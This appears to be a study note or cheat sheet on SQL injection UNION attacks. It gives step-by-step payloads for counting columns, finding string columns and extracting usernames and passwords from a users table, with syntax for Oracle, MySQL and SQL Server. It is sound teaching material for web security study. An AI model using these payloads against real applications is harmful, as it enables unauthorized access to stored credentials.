# SQL injection UNION attacks

## What is UNION Attack?
Combines results from your injected SELECT query with the original query results. Works only when the application displays query results directly in the response.

Two key requirements
1. Same column count - Original and injected queries must return the same number of columns
2. Compatible data types - Data types in each column must be compatible between queries

### Step 1: Find number of columns
#### Method A: ORDER BY
Increment the column position until you hit an error
```sql
ORDER BY 1--;
ORDER BY 2--
ORDER BY 3--
ORDER BY 4-- ← Error? 3 columns
```
#### Method B: UNION SELECT NULL
Add NULLs until no error (NULL works with any data type)
```sql
UNION SELECT NULL--
UNION SELECT NULL,NULL--
UNION SELECT NULL,NULL,NULL-- ← Success?
```

### Step 2: Identify string columns
Replace NULL with strings one at a time. Watch for errors—they indicate non-string columns.
```sql 
' UNION SELECT 'a', NULL, NULL--
' UNION SELECT NULL, 'b', NULL--
' UNION SELECT NULL, NULL, 'c'--
```

### Step 3: Extract data
Once you know the table/column names, query directly

```sql
 UNION SELECT username, password FROM users--
 ```

### Step 4: Combine multiple columns (if needed)
If only one string column exists, concatenate values with a separator

```sql
 UNION SELECT username || '~' || password FROM users--
 ```

Use || (Oracle), CONCAT() (MySQL), or + (SQL Server)

## Database-specific syntax
Oracle

```sql
' UNION SELECT NULL FROM DUAL--
```
Must include FROM clause (use DUAL table)

MySQL
```sql
' UNION SELECT NULL-- (space required after --)
' UNION SELECT NULL#
```
Use space after -- or # for comments

SQL Server
```sql
' UNION SELECT NULL--
```
Use + for concatenation